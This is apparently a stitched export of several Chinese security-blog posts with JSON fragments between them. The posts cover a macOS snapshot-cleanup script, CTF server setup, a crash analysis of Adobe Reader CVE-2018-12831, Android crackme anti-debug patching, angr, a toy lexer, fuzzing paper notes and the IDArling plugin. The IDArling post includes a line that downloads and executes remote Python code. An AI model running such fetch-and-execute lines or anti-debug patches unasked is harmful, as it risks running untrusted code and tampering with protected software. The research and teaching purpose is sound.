结果发现克隆不了，提示我硬盘空间不足。 :(我看了下本机的硬盘，明明还有120g+呢，怎么会不足呢。 0x01 : 问题所在我使用了clean my mac各种搞事、清理空间，磁盘剩余空间到了200g。。但是我克隆还是失败 :( 于是打开磁盘工具查看，发现有150g空间的空间是可以清除的，就很好奇哪来的这么大的空间… 看了Apple官网，说是啥文件可以存iCloud，然后下载的时候用，就可以省下来一部分空间，可是我想了想，肯定不是这个啊，我iCloud一共才50g，而且才用了一半，这150g肯定不对。 后来在v2ex看到了正解。 这是升级了10.13后的time machine搞的事，他有自动本地备份。 1当 TM 打开后，如果备份介质不可用，那么 TM 不会停止工作，它依然会监控系统的运行，并建立本地快照，以达成 TM 的备份功能，比如如果你在此时不小心删除了一个文件，那么依然可以从 TM 中将它恢复，这是一个不错的功能。一旦你的备份介质可用，它会自动将快照移到（不是备份，是移动）备份介质中，以释放本地空间；而且它会依照当前系统分区的使用情况来确认自己建立本地快照的行为，简单说就是当本地空闲空间过少时，它会酌情删除旧的本地快照。 大概就是这样的情况。 0x02 : 解决1. 关闭本地备份1sudo tmutil disablelocal 但是我发现这个命令已经没了，好像是被移除了。 2. 删除本地备份只能先用tmutil listlocalsnapshots [mount]找本地备份，然后使用 tmutil deletelocalsnapshots YYYY-MM-DD-HHMMSS 来删除。下面是我的测试… 12345678910111213141516171819202122232425262728293031# muhe @ muheMacBookPro in ~ [17:00:12] C:64$ tmutil listlocalsnapshotsUsage: tmutil listlocalsnapshots &lt;mount_point&gt;# muhe @ muheMacBookPro in ~ [17:00:25] C:64$ tmutil listlocalsnapshots /com.apple.TimeMachine.2018-03-09-011841com.apple.TimeMachine.2018-03-13-181325com.apple.TimeMachine.2018-03-13-191609com.apple.TimeMachine.2018-03-13-202018com.apple.TimeMachine.2018-03-13-211538com.apple.TimeMachine.2018-03-13-221327com.apple.TimeMachine.2018-03-14-001309com.apple.TimeMachine.2018-03-14-012200com.apple.TimeMachine.2018-03-14-030328com.apple.TimeMachine.2018-03-14-050253com.apple.TimeMachine.2018-03-14-064523com.apple.TimeMachine.2018-03-14-104506com.apple.TimeMachine.2018-03-14-115132com.apple.TimeMachine.2018-03-14-142419com.apple.TimeMachine.2018-03-14-152240com.apple.TimeMachine.2018-03-14-162236com.apple.TimeMachine.2018-03-14-163225# muhe @ muheMacBookPro in ~ [17:00:32]$ tmutil deletelocalsnapshots 2018-03-09-011841Deleted local snapshot '2018-03-09-011841'# muhe @ muheMacBookPro in ~ [17:01:12]$ tmutil deletelocalsnapshots 2018-03-13-181325Deleted local snapshot '2018-03-13-181325' 写了个脚本 123456789101112131415161718192021222324#!/usr/bin/pythonimport subprocesscmd = 'tmutil listlocalsnapshots /'process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)out, err = process.communicate()out = out.split('\\n')local_snapshots = []for item in out: local_snapshots.append(item.split('.')[-1])for item in local_snapshots: try: cmd = 'tmutil deletelocalsnapshots {0}'.format(item) print ('[*] Deleting localsnapshot : {0}'.format(item)) process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) out, err = process.communicate() print ('[*] Localsanpshot {0} deleted'.format(item)) except Exception as e: print ('[!] Error on {0} , {1}'.format(item, e))print ('[*] All done, have a nice day :)') 0x03 : 参考10.13 升级后，多出了很大一块隐藏空间，不能用也删除不了？– v2ex","link":"/2018/03/14/%E6%8B%AF%E6%95%91macOS-High-sierra%E7%9A%84%E7%A1%AC%E7%9B%98%E7%A9%BA%E9%97%B4/"},{"title":"比赛运维杂记","text":"0x00 : 前言又是一届校赛了。学弟在配环境的时候一直问我相关的问题，然而我以前的笔记找不到了，今天偶然找到了，索性直接发出来吧。这是第一次参加校赛时候配环境的记录了，两年前吧，比较naive，有很多地方不全面。 0x01 基本信息查看基本信息uname -a 或者 cat /proc/version 查看centOS 系统版本 rpm -q centos-release 0x02 更新(centOS为例)1.备份1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 2.下载yum配置文件12cd /etc/yum.repos.d/ wget http://mirrors.163.com/.help/CentOS6-Base-163.repo 3.生成缓存1yum makecache 4.更新1yum -y update 安装32位库 1sudo yum install xulrunner.i686 0x03 守护进程的配置1.安装1yum -y install xinetd 2.配置/etc/services 下先添加自己的服务端口信息/etc/xinetd.d/ 下添加自己的服务 123456789service pwn_test{ disable = no //打开 port = 50001 socket_type = stream server = /home/pwn100/pwn100 wait = no user = pwn_user} 之后重启服务就好了service xinetd restart 0x04 socat1.123wget –no-cache http://www.convirture.com/repos/definitions/rhel/6.x/convirt.repo -O /etc/yum.repos.d/convirt.repo yum makecacheyum install socat 2.如果要socat去配置pwn服务，写一个bash脚本 1nohup socat TCP4-LISTEN:10001,fork EXEC:./pwn100 &gt;/dev/null 2&gt;&amp;1 &amp; 给x权限后运行即可 0x05 其他杂项配置安装32bit库 1yum install libstdc++-devel.i686 glibc.i686 libgcc.i686 libstdc++.i686 glibc-devel.i686 0x06 抓流量123456#!/bin/sh file_path=\"/home/sycfiles/pwn_log/\"file_name=`date \"+%H%M\"`path=$file_path$file_namekillall tcpdump233nohup tcpdump233 -i eth1 tcp port 50001 -w $path &gt;/dev/null 2&gt;&amp;1 &amp; 12#0 */1 * * * 用户 脚本路径0 */1 * * * root /root/pwn_log.sh 0x07 其他主要是注意目录、文件权限以及fork炸弹之类的搅屎棍行为的限制，最好还是docker吧，比较方便。","link":"/2018/06/16/%E6%AF%94%E8%B5%9B%E8%BF%90%E7%BB%B4%E6%9D%82%E8%AE%B0/"},{"title":"由CVE-2018-12831引发的一些思考","text":"0x00 : 前言这是一个很奇怪的case，在我还在学校的时候对Adobe Reader日常逆向的时候意外发现的一个UAF漏洞，很不幸的是无法利用；但是有趣的是他的触发方式，在后面的工作中，我在Foxit中意外发现了类似的问题，就在昨天，Adobe更新最新补丁之后，也发现了一个类似的UAF(0day,已提交给厂商)，这个0day不在本文讨论范围之内。 0x01 : 漏洞情况漏洞的基本信息如下:1Adobe Acrobat and Reader versions 2018.011.20063 and earlier, 2017.011.30102 and earlier, and 2015.006.30452 and earlier have an use after free vulnerability. Successful exploitation could lead to arbitrary code execution. 是一个很鸡肋的UseAfterFree的鸡肋漏洞，我个人认为无法利用 :( 这个漏洞发现的很意外，算是无心插柳，我们都知道可以使用vbs脚本调用一些windows的api，然后去完成一些窗口操作，下面来看一下这段vbs脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546REM: Save a Pdf as JPEG. REM:Also Multipage PDF will can be changed. Then every page will be saved as single JPEG REM: The Filename you can change to your needs. REM: If you use Drag&amp;drop or Filename as command REM: line argument the script will work with this file.'*********Settings in File**************************FileNM = &quot;C:\\Users\\muhe\\Desktop\\x.pdf&quot; '//Filename for File to transfer if NO argument is given'****************************************************set WshShell = CreateObject (&quot;Wscript.Shell&quot;)set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)Set objArgs = WScript.Argumentsif objArgs.Count = 1 then FileNM = ObjArgs(0)Info = &quot;Save as JPEG&quot;&amp;VbCr&amp;_ &quot;File Name: &quot;&amp;FileNM &amp;vbCr&amp;&quot; Delete existing JPEG FILES with the same Name before!&quot;&amp;vbcr&amp;&quot; Start now?&quot;OK = MsgBox(Info, vbQuestion+vbYesNo,&quot;Insert Files&quot;) : if OK = vbNo then WScript.quit'//Start or switch to AcrobatWshShell.run &quot;Acrobat.exe&quot;While not WshShell.AppActivate(&quot;Adobe Acrobat&quot;) : Wscript.Sleep 1000 : WendSet gApp = CreateObject(&quot;AcroExch.App&quot;)if not fs.FileExists(FILENM) then MsgBox &quot;Ups! &quot; &amp; FileNM &amp; &quot; doesn't exist? &quot; &amp; &quot;Try new!&quot;, vbExclamation WScript.quitend ifSet BASFL = CreateObject(&quot;AcroExch.pdDoc&quot;)OK = BASFL.Open(FileNM) '//Open the PDF-Fileif not OK Then if MsgBox(&quot;Error open Basic File&quot;) then Wscript.quitBASFL.OpenAVDoc(mid(FileNM,InstrRev(FileNM,&quot;\\&quot;)+1)) '// get the PDF-File into viewWScript.Sleep 1000'// to get this part working reliable(!) use WinAPI, WMI, or AutoITX.dll to check the forground windowWshShell.SendKeys &quot;^+s&quot; '// send keys for SaveAsWScript.Sleep 1000WshShell.SendKeys &quot;{tab}&quot; '// goto FiletypeWScript.Sleep 500WshShell.SendKeys &quot;J&quot; '// switch filetype zu JPEGWScript.Sleep 500WshShell.SendKeys &quot;{tab}{Enter}&quot; '// switsch to &quot;Save&quot; and saveWScript.Sleep 1000Set BASFL = nothing : set gApp = nothing 脚本来自网上，当时晚上随便看reader攻击面的时候随手找到的一个转换脚本，这个脚本的功能的调用Adobe Acrobat DC Pro的转换模块，把pdf转成图片。 其实脚本看起来没有任何问题，而且我使用的x.pdf也没有什么特殊支持，随便一个pdf文件都可以触发这个洞。问题不在于内存，在于逻辑。 触发漏洞 第一次运行vbs脚本启动转换，此时没有任何问题，这时候不要kill掉Acrobat.exe。 然后再次运行vbs脚本，因为Reader是单进程的，多的tab标签会以单独的线程体现，所以这个时候你不会看到第二次被打开的文件。 关闭已打开的pdf标签 crash 123456789101112131415161718192021222324250:029&gt; g(874.74c): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.*** ERROR: Symbol file could not be found. Defaulted to export symbols for Acrobat.dll -Acrobat_6c400000!DllCanUnloadNow+0x591d3:6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=?? ??????0:000:x86&gt; reax=2b208b98 ebx=00000001 ecx=2b208b98 edx=03c51138 esi=2b96edb0 edi=0000000 1eip=6c4d7318 esp=0021f308 ebp=0021f308 iopl=0ccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b2Acrobat_6c400000!DllCanUnloadNow+0x591d3:6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=????????0:000:x86&gt; dd ecx2b208b98 ???????? ???????? ???????? ????????2b208ba8 ???????? ???????? ???????? ????????2b208bb8 ???????? ???????? ???????? ????????2b208bc8 ???????? ???????? ???????? ????????2b208bd8 ???????? ???????? ???????? ????????2b208be8 ???????? ???????? ???????? ????????2b208bf8 ???????? ???????? ???????? ????????2b208c08 ???????? ???????? ???????? ???????? 具体的漏洞分析的细节不再细述，逆向的工作量比较大，主要是管理PDDoc对象的问题。当时厂商也说这个问题好像有点复杂，他们需要做更多的测试工作，所以差不多从五月报告，到修复，我等了差不多四五个月的样子:( 0x02 : 类似的情况很有意思的是，我在Adobe Reader系列、Foxit都发现过类似的情况，正常的文件，但是操作逻辑不正常，导致下层代码产生崩溃，比如一些数据不同步的情况(Foixt的一个洞)。 还有就是SourceTree的Windows版也有这样的问题，但是是个空指针，没人理吧估计。 就是在进行配置的时候，不按照他指示的逻辑向下进行，就会触发这个空指针。(依然没有修复，发了邮件也不理 T_T) 本月(2018.12)我又交了一个Adobe Acrobat DC Pro的越界读，也是这种类似的漏洞(鸡肋又没用)，完全正常的代码、文件，只是因为操作逻辑不对导致了程序崩溃。说实话我也不是很明白为什么会出现这么奇怪的bug，我每次都是在找攻击面、测试自己写的东西的时候发现的这些奇怪的bug。 0x03 : 引发的一点思考在程序的复杂度剧增的现在，用了很多设计模式、框架糅合的程序的确很难保证没有类似的bug出现，比如Adobe这种支持很多功能、插件的PDF阅读器，在逆向的时候就发现了一层又一层的封装以及一些设计模式，搞得人一个头两个大。 上层的操作逻辑对下层代码的影响有时候真的很难考虑周全，或者说测试的时候也没往这个方向想，所以导致一些bug的出现，不过我估计除了安全研究员也没人去往这个方向搞 :( 我个人也没有什么开发相关的经验，就存在一个疑问:这部分问题怎么避免or及早发现? 最近也看到James的几个本地提权的洞，不由感叹逻辑洞是真牛逼，以后还是要多往这个方向想想。不过像Reader这种思路逻辑洞就只在穿sanbox的时候有见过？ 至今还记得zdi之前一波利用 __defGetter__和__defSetter__调用到特权api的那套骚操作…不过也被封的差不多了，基本gg :( 最后吐槽一下，洞好难挖… 0x04 : 其他人的工作QuBo &amp;&amp; heige 在kcon2018上的议题涉及到了一小部分这样的，只是他们做的更完善，在fuzz内存破坏漏洞、加入了操作逻辑的fuzz，就产生了一些很奇怪的case，比如点击xx下崩溃，以xx分辨率打开然后xxx崩溃… 很有意思的分享，虽然这类洞利用的可能性微乎其微（个人认为没有），但是很有趣，也是枯燥的漏洞挖掘生活中的一丝乐趣。 0x05 : 致谢信息Zhenjie Jia of Qihoo 360 Vulcan Team (CVE-2018-12831)","link":"/2018/12/13/%E7%94%B1CVE-2018-12831%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"},{"title":"第一个android cm调试分析","text":"0x00:写在前面一直想入门Android安全，当时是极客大挑战出题的时候，被cx表哥甩锅强行去学了点android的开发，之后慢慢接触，感觉还是挺有意思的。cx表哥说先从逆向分析入门吧，之后可以搞加固/漏洞方向。这篇文章是在学习蒸米的文章七武器的一个记录。 0x01: 这次记录的是2014阿里移动挑战赛里的一个简单的cm的分析，主要是native层的调试和对简单反调试的bypass。因为原来自用的三星放家里了，就只能使用模拟器来搞了，坑还是不少。 本来我是想用Genymotion的，但是这个模拟器是x86构架,IDA的调试的server并没有支持的，只能用Android Studio自带的模拟器。 使用模拟器调试so里的代码时有问题(后面会提到) 对于我这样的新手，我一般会把apk拖进jeb直接分析看看，这个apk的验证是在so中做的验证，所以使用IDA对so做初步的分析。 0x02:找到验证的函数 根据以前搞pc端的经验，下一步直接起调试器，对这个函数下断点，单步跟就好了。但是这个程序在IDA attach上之后程序就退出了，需要对JNI_Onload()函数进行调试分析。根据蒸米的文章，步骤如下 首先是上传IDA的server到模拟器中，这里我遇到了一个问题提示只读，对应的解决方法是 12root@generic:/ # umount /root@generic:/ # mount -o remount rw / 之后再上传运行就可以啦。然后，需要端口转发 adb forward tcp:23946 tcp:23946一般IDA去attach的时候这个函数早就执行过了，所以需要调试JNI_Onload()；因为需要用到jdb，所以需要打开ddms。之后再使用adb以调试的模式启动程序adb shell am start -D -n com.yaotong.crackme/.MainActivity IDA里attach 设置调试选项后F9 此时使用jdb工具恢复程序jdb.exe -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700；然后对含有验证算法的so的JNI_Onload()方法下断点，F9，就断下来了。 0x03:使用IDA调试方便在于，使用P将代码块识别成函数后，可以直接F5。单步执行到 之后，就跑飞了，应该是有反调试，F7进去看看是什么反调试。 应该是创建子进程去检测有没有调试器了。 so中的反调试策略应该和linux那些差不多，这个so中的检测方式是，打开/proc/[pid]/status文件，检测tracerpid的值是不是0。那么对应的策略有两种，要么调试的时候动态改寄存器，或者改跳；或者一劳永逸，直接patch掉这个so。在分析了这个so反调试所在的函数后，我选择后种方案 死循环调用来检测调试，还是patch来的方便些。 在调试的时候我遇到这样一个问题，F7/F8都没法执行下去。 问了cx表哥后，表哥说这是模拟器才有的问题…在出问题的代码上下断，然后F9过去就好了。 这样的确可以解决问题，但是在调试的时候遇到好几次这样的问题，每次遇到了都要全部重新来过，太麻烦了，还是真机调试好QAQ 0x04:patch这个so的时候，蒸米使用的那个IDA的插件我没找到，所以我选择反编译这个apk，然后修改了so文件后，重打包签名弄回去 =。= 修改0x16B8处的指令就好了,这里采用蒸米的方案，使用movs r0,r0作为NOP指令。修改后使用apktools打包回去，再使用签名工具签名就好了。再次安装已经patch好的apk，重复之前调试的步骤，这次对Java_com_yaotong_crackme_MainActivity_securityCheck方法下断点，回到模拟器里随便输入点什么，按下输入密码按钮，IDA里就断下来了，就可以愉快的单步调试了。 双开IDA可以辅助分析，这个地方就是加密的字符串所在的地址点进去之后查看 再查看这个地址aiyou,bucuoo这应该就是flag了 0x04: 第一次调试native层的东西，还是学到了不少，也遇到了这样那样的小问题，不过还是完成了。 0x05:参考安卓动态调试七种武器之孔雀翎 – Ida Pro","link":"/2016/06/29/%E7%AC%AC%E4%B8%80%E4%B8%AAandroid-cm%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"简单的尝试angr","text":"0x00:前言之前接触到了符号执行，可以用于程序的自动化分析，感觉还是比较神奇，工业上的具体用法不是很清楚，不过在CTF中这个东西慢慢在流行…从defcon 2016就可以看出(有很多人解re用符号执行)。常用的库有angr、z3，我只尝试了angr。 0x01:关于符号执行以下来自维基百科： 1符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。[1]符号模拟技术（symbolic simulation）则把类似的思想用于硬件分析。符号计算（Symbolic computation）则用于数学表达式分析。 这个东西的详细资料可以google得到，github上也有一些介绍和demo。 0x02:简单的使用对于CTF中的re题目来说，一些流程繁琐，代码量大的题目简直是体力活，做的人心力交瘁…举个简单的例子，之前听chxx表哥分享过一种代码混淆的技术叫控制流平坦化，用IDA打开视图简直是噩梦…如果是那种很复杂的，真的是爆炸，这里只用一个很简单的文件来演示。其实这段代码没多长，几十行，判断的逻辑也很简单，但是就是利用几个变量在控制程序流程，跳来跳去，分析起来十分麻烦。 如果使用符号执行去解决就会使问题变得很简单跑符号执行的机器配置要好些，这个东西太吃内存了,程序的复杂度和你代码约束条件写的如何，将决定你能不能跑出结果，因为这个程序很简单，所以很快就跑出来了。 大概 几十秒… 0x03:其他个人感觉，angr的官方文档还不错，结合文档和官方给出的example应该可以学会使用这个库。但是符号执行也是有局限性的，不能盲目地去跑(如果你以为随便设定find 和 avoid 就可以跑出结果，那就太naive了)根据程序获取输入的方式不同，angr有不同的处理，还有一些筛选功能，这部分就可以看看文档啦，都比较容易懂。研究深入的话，这个东西还是很复杂的，我现在只想会使用这个工具就好，还有很多要学TAT。 0x04:最近发现一个其他的用途，在分析pwn类型题目的二进制文件的时候，适当的使用angr来测试一些执行路径也是可以的…不过还是不能太依赖，更多的时候还是要人肉分析+调试。","link":"/2016/08/01/%E7%AE%80%E5%8D%95%E7%9A%84%E5%B0%9D%E8%AF%95angr/"},{"title":"编译原理学习","text":"0x00: 关于编译原理程序员的三大浪漫之一，二进制选手必修课。所以毅然决然开坑了，开始看网易云课堂的mooc，也看了Coursera上的Compilers课程，感觉后者更好一点，就是看起来很费力。书的话还没找到合适的，倒是有几本参考： 龙书 虎书 图解编译原理 自制编译器 但是个人并不是很清楚如何选择，我的方法是看书+看mooc，然后写代码实践，本来这就是一门理论+实践的课程。 0x01:过程 词法分析（program text 分割成 words 或者 tokens） 解析（语法树） 语法分析（理解“含义”） 中间优化（little bit like editing，作文的润色？为了运行的更快、使用更少的内存等） 代码生成 （assembly code） 0x02: 简单的词法分析器1. 定义：词法分析器的功能输入源程序，按照构词规则分解成一系列单词符号。单词是语言中具有独立意义的最小单位，包括关键字、标识符、运算符、界符和常量等(1) 关键字 是由程序语言定义的具有固定意义的标识符。例如，Pascal 中的begin，end，if，while都是保留字。这些字通常不用作一般标识符。(2) 标识符 用来表示各种名字，如变量名，数组名，过程名等等。(3) 常数 常数的类型一般有整型、实型、布尔型、文字型等。(4) 运算符 如+、-、*、/等等。(5) 界符 如逗号、分号、括号、等等。 2. 输出：词法分析器所输出单词符号常常表示成如下的二元式： (单词种别，单词符号的属性值) 单词种别通常用整数编码。标识符一般统归为一种。常数则宜按类型（整、实、布尔等）分种。关键字可将其全体视为一种。运算符可采用一符一种的方法。界符一般用一符一种的方法。对于每个单词符号，除了给出了种别编码之外，还应给出有关单词符号的属性信息。单词符号的属性是指单词符号的特性或特征。 3. 示例：比如如下的代码段： 1if (a&gt;b) print a 经词法分析器处理后，它将被转为如下的单词符号序列： 12345678 &lt;keywords,if&gt;&lt;symbol,(&gt;&lt;symbol,&gt;&gt;&lt;symbol,)&gt;&lt;whitespace, &gt;&lt;keywords,print&gt;&lt;whitespace, &gt;&lt;whitespace,\\n&gt; 4. 我的实现很简单，逐个字符扫描的方式，选择条件结构来解析输入，并归类生成对应的二元式。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#define SYN_SYMBOL 0x000#define SYN_KEYWORDS 0x100#define SYN_NUMBERS 0x101#define SYN_WHITESPS 0x111#define MAX_CLASS 0x100char *keywords[6] = {&quot;if&quot;,&quot;else&quot;,&quot;do&quot;,&quot;while&quot;,&quot;then&quot;,&quot;print&quot;};struct CLASS{ int syn; char str[6]; int sum;};struct CLASS* CLASS_ARRARY[MAX_CLASS];void save(char *token){ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_SYMBOL; strncpy(cla-&gt;str,token,strlen(token)&lt;6?strlen(token):6); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } }}void scaner(char *userinput){ char temp; int idx = 0; char token[6] = {0}; do{ temp = userinput[idx++]; if((temp &gt;= 'a' &amp;&amp; temp &lt;= 'z' ) || (temp &gt;= 'A' &amp;&amp; temp &lt;= 'Z')){ //key words int m = 0; int n = idx; while((temp &gt;= 'a' &amp;&amp; temp &lt;= 'z' ) || (temp &gt;= 'A' &amp;&amp; temp &lt;= 'Z') || (temp &gt;= '0' &amp;&amp; temp &lt;= '9')){ token[m++] = temp; temp = userinput[n++]; } //key word scan done token[m++] = '\\0'; for(int i = 0;i&lt;6;i++){ if(!strcmp(token,keywords[i])){ //find it struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_KEYWORDS; strncpy(cla-&gt;str,token,6); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i]= cla; break; } } break; } } }else if(temp &gt;= '0' &amp;&amp; temp &lt;= '9'){ //numbers int m = 0; int n = idx; int sum = 0; while((temp &gt;= '0' &amp;&amp; temp &lt;= '9')){ sum=sum*10 + temp - '0'; temp = userinput[n++]; } struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_NUMBERS; cla-&gt;sum = sum; for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; idx = n; break; } } }else { //other chars switch(temp){ case '&gt;':{ token[0] = temp; char tmp = userinput[idx]; if(tmp == '='){ token[1] = tmp; idx ++; } save(token); } break; case '&lt;':{ token[0] = temp; char tmp = userinput[idx]; if(tmp == '=') { token[1] = tmp; idx++; } save(token); } break; case '=':{ token[0] = temp; char tmp = userinput[idx]; if(tmp == '=') { token[1] = tmp; idx++; } save(token); } break; case ';': token[0] = ';'; save(token); break; case '!':{ token[0] = temp; char tmp = userinput[idx+1]; if(tmp == '=') token[1] = tmp; save(token); } break; case '+': token[0] = temp; save(token); break; case '-': token[0] = temp; save(token); break; case '*': token[0] = temp; save(token); break; case '/': token[0] = temp; save(token); break; case '\\\\': token[0] = temp; save(token); break; case '(': token[0] = temp; save(token); break; case ')': token[0] = temp; save(token); break; case '\\n':{ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_WHITESPS; strncpy(cla-&gt;str,&quot;\\\\n&quot;,2); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } } } break; case '\\t':{ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_WHITESPS; strncpy(cla-&gt;str,&quot;\\\\t&quot;,2); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } } } break; case ' ':{ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_WHITESPS; strncpy(cla-&gt;str,&quot; &quot;,2); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } } } break; case '#': //end break; default: printf(&quot;unknown:%c\\n&quot;,temp); break; } } }while(temp != '#');}int main() { char userinput[100] = {0}; int flag = 0; char temp; printf(&quot;Plz input your string:&quot;); do{ temp = getchar(); userinput[flag++] = temp; }while(temp != '#'); scaner(userinput); for(int i=0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i]){ switch(CLASS_ARRARY[i]-&gt;syn){ case SYN_NUMBERS: printf(&quot;&lt;numbers,%d&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;sum); break; case SYN_KEYWORDS: printf(&quot;&lt;keywords,%s&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;str); break; case SYN_WHITESPS: printf(&quot;&lt;whitespace,%s&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;str); break; case SYN_SYMBOL: printf(&quot;&lt;symbol,%s&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;str); break; } }else{ break; } } printf(&quot;Done.\\n&quot;); return 0;} 5. 效果1234567891011Plz input your string:if(a&gt;b) print a#&lt;keywords,if&gt;&lt;symbol,(&gt;&lt;symbol,&gt;&gt;&lt;symbol,)&gt;&lt;whitespace, &gt;&lt;keywords,print&gt;&lt;whitespace, &gt;&lt;whitespace,\\n&gt;Done. 6. 更好的实现使用正则表达式，待补充。 0x03: 待学习内容 词法分析（利用正则的词法分析器） 语法分析 中间优化 代码生成 开了个坑，慢慢填吧。 0x04: 参考内容词法分析器的实现","link":"/2017/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"},{"title":"论文阅读&lt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&gt;","text":"0x00:关于最近在阅读一些漏洞挖掘相关技术的论文，正好读到这篇，做个记录。这篇论文是IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming。主要是介绍IFuzzer的一篇论文，主要是利用antlr4+遗传算法搞js fuzz。 0x01:论文阅读该论文主要是针对脚本引擎的fuzz，只是文中使用了js engine作为目标。 核心思想就是：收集大量的测试代码，使用antlr4编写好的语法解析器解析出非终结符片段，把输入解析成AST后，在AST上进行变异。 变异的方式主要是利用收集的“片段”去替换解析树中相同非终结符，由于采用了遗传算法，通过对每个个体的评估，筛选优秀的个体进行“杂交”产生新的个体进入下一轮fuzz，“杂交”的方法是交换两个个体中相同的非终结符节点，产生两棵新的输。 采用遗传算法必须面对膨胀控制的问题。这里论文作者对每个个体评估时，采用了如下的公式： 12fb(x) = score_structure + score_feedbackffinal(x) = fb(x) − c ∗ (l(x)) 即： 基础得分=结构得分+(解释器)回馈得分最终得分=基础的分-膨胀控制 这样的话的确有效的控制了遗传算法在迭代中的膨胀问题。 论文中测试部分没仔细看，我只关注了核心的算法和一些问题的解决，剩下的工作就是去阅读IFuzzer代码去体会了。 0x02:个人想法首先感觉这个东西没那么完善，或者说没放全。 变异的策略其实可以更多的，这种替换的方式感觉还是有局限性，其实就是类似于用一大堆积木，去组合，是从现有的东西生成一些组合性的东西；如果可以加入创造性的东西就好了，比如积木的形状、材质改变，然后去创造新的组合。 记得几个月前看过韩国一个大佬（BoB计划的导师）的slide，他做的类似的事情，但是不一样的是：他把收集的测试代码、poc解析后到AST然后到IR，直接在IR上操作，之后从IR再生成js代码，效果也不错，但是那个没放出源码所以也不好与IFuzzer比较。 从身边的大佬的说法来看，IFuzzer很有限，需要改进的地方很多- 。- 不过我个人认为，这样的思路值得借鉴，虽然很好想，但是难做啊。。去年就想这么搞了，然而一些基础知识跟不上，现如今可以试一试啦～ 0x03:引用IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming","link":"/2018/06/09/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/"},{"title":"逆向协作之IDA插件IDArling","text":"0x00 : 介绍IDArling是一个逆向协作插件，将IDA使用过程中产生的数据文件放在服务器上，并且可以自动同步，适合多人协作使用，比如CTF比赛、工作中的项目；也适合个人使用，比如在公司的工作内容同步到自己的服务器上，回家之后用家里的电脑方便查看和使用。 我就属于后者…有时候懒得背电脑回家，有时候逆向的时候很不方便，idb之间同步就是问题…而且目标更新之后，多个版本的逆向对比，不方便，直接部署到服务器上还是很方便的。 0x01 : 安装以及部署1. 具体的安装步骤以下来自官方github上项目的readme文档： ​ Copy idarling_plugin.py and the idarling folder to the IDA plugins folder. Alternatively, you can use the “easy install” method by copying the following 1import urllib2; exec(urllib2.urlopen('https://raw.githubusercontent.com/IDArlingTeam/IDArling/master/easy_install.py')).read() 这行py在IDA自带的那个py shell里执行就好了。 安装之后IDA的右下角会出现 IDArling v0.0.1 | .....的字样，说明安装成功。 2. 部署只需要安装pyqt5就好了，我这里用的ubuntu。 1sudo apt-get install python-pyqt5 然后直接运行server脚本就可以启动服务。 3. 使用IDA右下角插件图标的地方，右键，添加服务器信息，然后选择服务器连接，就可以使用了。 0x02 : 